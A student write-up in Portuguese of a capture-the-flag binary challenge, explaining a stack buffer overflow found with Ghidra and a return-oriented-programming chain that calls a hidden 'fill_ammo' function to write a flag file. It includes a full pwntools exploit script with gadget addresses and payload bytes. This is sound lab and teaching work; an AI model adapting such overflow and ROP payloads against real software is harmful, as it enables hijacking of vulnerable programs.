### Trabalho3:

	Para fazer o trabalho 3 eu usei o software de engenharia reversa Ghidra. Na função main eu consegui observar que o usuário pedia para ler até 102 bytes, porém o tamanho certo seria somente 40 bytes (4 variaveis locais de 8 bytes e o endereço de retorno de 8 bytes). Pois então, eu poderia sobreescrever o valor de retorno da função, para o programa ir executar outra função, invés de encerrar (como estava).

	Com isso, eu observei que existia uma função chamada "fill_ammo", a qual não era chamada, porém escrevia no meu arquivo "flag.txt". Essa função também tinha 3 parâmetros, os quais encerravam o programa caso não estivessem preenchidos com os valores corretos. Então, através de ROP (Return oriented programming) eu conseguiria sobreescrever o valor de retorno da minha função main e colocar a função que eu quisesse.

	Antes de chamar a minha função fill_ammo, eu preciso carregar nos registradores que guardam os 3 primeiros parâmetros da função os valores certos (rdi, rsi, rdx). Para isso, eu usei um programa em Python que faz a programação voltada a retorno, o qual carrega os primeiros 40 bytes de lixo, os próximos 8 bytes com o valor correto do registrador RDI, os próximos 8 bytes com o valor do registrador RSI, os próximos 8 bytes com o valor do regristrador RDX e, por fim, chamar a função fill_ammo, a qual passará por todos os condicionais dos valores dos parâmetros e chegará na etapa de escrever no arquivo flag.txt.

## Programa em Python usado para fazer ROP:

from pwn import *
context.binary = './rocket_blaster_xxx'
p = process('./rocket_blaster_xxx') //ARQUIVO EXECUTÁVEL

padding = b'A'*40			//COLOCANDO OS PRIMEIROS 40 BYTES COMO LIXO (UM MONTE DE A's).
pop_rdi = p64(0x40159f)		//DANDO POP NO VALOR AONDE O RDI ESTÁ.
pop_rsi = p64(0x40159d)		//DANDO POP NO VALOR AONDE O RSI ESTÁ.
pop_rdx = p64(0x40159b)		//DANDO POP NO VALOR AONDE O RDX ESTÁ.
ret_gadget = p64(0x40101a)	//VALOR USADO PARA ALINHAR A PILHA APÓS CARREGAR OS REGISTRADORES.
fill = p64(0x4012f5)		//VALOR DE RETORNO PARA CHAMAR A FUNÇÃO FILL_AMMO.

payload = padding			//COLOCANDO OS 40 A's
payload += pop_rdi + p64(0xdeadbeef)	//POP NO VALOR DE RDI E COLOCANDO O VALOR NO REGISTRADOR.
payload += pop_rsi + p64(0xdeadbabe)	//POP NO VALOR DE RSI E COLOCANDO O VALOR NO REGISTRADOR.
payload += pop_rdx + p64(0xdead1337)	//POP NO VALOR DE RDX E COLOCANDO O VALOR NO REGISTRADOR.
payload += ret_gadget					//RET PARA ALINHAMENTO DA PILHA.
payload += fill							//CHAMANDO A FUNÇÃO FILL_AMMO

p.send(payload)
p.interactive()


